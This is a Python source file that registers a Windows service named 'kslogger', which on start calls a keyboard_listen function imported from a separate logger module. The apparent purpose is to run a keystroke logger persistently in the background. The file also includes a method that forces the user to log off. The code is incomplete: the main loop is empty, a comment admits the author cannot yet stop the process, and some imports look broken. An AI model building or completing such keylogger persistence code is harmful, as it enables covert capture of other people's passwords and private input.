import newestbio.main
import pywin.framework
import pywin32_system32
import pywin
import win32serviceutil
import win32event
import win32service
import socket
import servicemanager
import os
from logger import keyboard_listen


class KsLogService(win32serviceutil.ServiceFramework):
    """base class to create a windows service python"""
    
    _svc_name_ = "kslogservice"
    _svc_display_name_ ='kslogger'

    @classmethod 
    def parse_command_line(cls):
        '''
        ClassMethod to parse the command line
         '''
        win32serviceutil.HandleCommandLine(cls)
    
    
    def __init__(self,args):
        win32serviceutil.ServiceFramework.__init__(self,args)
        self.hWaitStop = win32event.CreateEvent(None,0,0,None)
        socket.setdefaulttimeout(60)
    def logout(self):
        '''
        Logout the user on the host machine.
        '''
        os.system('shutdown -l')
    def SvcStop(self):
        '''
        Called when the service is asked to stop
        '''
        self.stop()
        self.ReportServiceStatus(win32service.SERVICE_STOP_PENDING)
        win32event.SetEvent(self.hWaitStop)
        
    def SvcDoRun(self):
        '''
        Called when the service is asked to start
        '''
        self.start()
        servicemanager.LogMsg(servicemanager.EVENTLOG_INFORMATION_TYPE,
                              servicemanager.PYS_SERVICE_STARTED,
                              (self._svc_name_, ''))
        self.main()
    def start(self):
        '''
        Override to add logic before the start
        eg. running condition
        '''
        
        keyboard_listen()
        print('hello')
        pass
    
    def stop(self):
        '''
        Override to add logic before the start
        eg. running condition
        '''
    
    def main(self):
        #need  to  figure out how to stop the process
        pass
    
if __name__ == '__main__':
    KsLogService.parse_command_line()